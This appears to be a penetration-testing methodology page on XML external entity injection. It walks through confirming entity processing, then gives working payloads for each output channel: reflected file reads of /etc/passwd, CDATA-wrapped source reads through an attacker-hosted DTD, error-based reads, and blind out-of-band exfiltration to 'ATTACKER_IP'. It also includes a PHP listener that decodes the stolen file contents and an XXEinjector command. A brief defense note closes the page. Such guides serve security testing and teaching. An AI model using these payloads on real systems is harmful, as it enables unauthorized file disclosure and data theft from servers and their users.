---
layout: page
title: "XML External Entity Injection (XXE)"
subtitle: "Testing XML parsers for external entities, from reflected file read to blind exfiltration"
permalink: /methodology/web-attacks/xxe/
---

XML external entity (XXE) injection happens when an application parses user-supplied XML with a parser that resolves external entities. A defined entity can point at a local file or a remote URL, and the parser substitutes its contents wherever the entity is referenced. The result can be disclosure of local files, requests to internal services, or in severe cases denial of service. The technique depends on what the application returns to the user, so the workflow is built around identifying that output channel.

## Workflow

1. **Find XML input.** Look for SOAP endpoints, XML request bodies, XML file uploads, and document formats that contain XML internally, such as SVG images and Office documents. Note the `Content-Type` and whether the server echoes any part of the input.
2. **Confirm entity processing.** Define a harmless internal entity and check whether its value appears in the response.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "EXAMPLE_VALUE">
]>
<email>
  <sender>&company;</sender>
</email>
```

3. **Read a file through a reflected entity.** If the value is reflected, point the entity at a local file. Use the same structure as the test above.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<email>
  <sender>&company;</sender>
</email>
```

4. **Read source code safely.** Files that contain `<`, `&` or other markup break the XML. Wrap the file in a CDATA section. Because an internal entity cannot be joined with an external one, define the joining in an external DTD using parameter entities. Host the DTD on the attacker's server.

```text
<!ENTITY joined "%begin;%file;%end;">
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/TARGET_FILE.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

5. **Use error-based output if nothing is reflected.** If the application shows parser errors, malform the XML (for example, remove a closing tag) to trigger them. Then reference a non-existent entity whose name includes the file's contents.

```text
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

6. **Use out-of-band exfiltration if the response is blind.** Wrap the file in a PHP base64 filter and send it to a listener in a URL parameter. Run a small listener that decodes the parameter.

```text
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

```php
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
$ php -S 0.0.0.0:8000
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

7. **Automate where appropriate.** Tools such as XXEinjector can repeat the out-of-band flow, including the PHP filter, for a chosen path.

```bash
$ ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 --file=./xxe.req --path=/etc/passwd --oob=http --phpfilter
```

## Decision points

| Observed behaviour | Channel to use |
| --- | --- |
| Entity value appears in the response | Reflected file read, with CDATA for markup-heavy files |
| Output hidden, but parser errors are shown | Error-based read |
| No output and no errors | Out-of-band exfiltration over HTTP, or DNS if HTTP egress is blocked |

## Pitfalls

- Some servers refuse to read files that would create an entity loop, such as the front controller itself. Read a different file or a copy.
- Error-based payloads have length limits, and certain characters break the message. Keep the file path short and test with a small file first.
- Parameter entities used in the external DTD are the only reliable way to join content. Inline joins fail.
- Out-of-band tests need outbound connectivity from the target. Confirm the callback before building the payload.

> Start with the simplest test that the response can show. Move to blind techniques only when the simpler ones fail, and keep a record of which channel worked for each endpoint.
{: .tip }

## Defense

Disable DTD processing and external entity resolution in the XML parser, keep the parser library current, and suppress runtime error output. See [Web Attacks Prevention](/methodology/web-attacks/prevention/) for the configuration checklist.
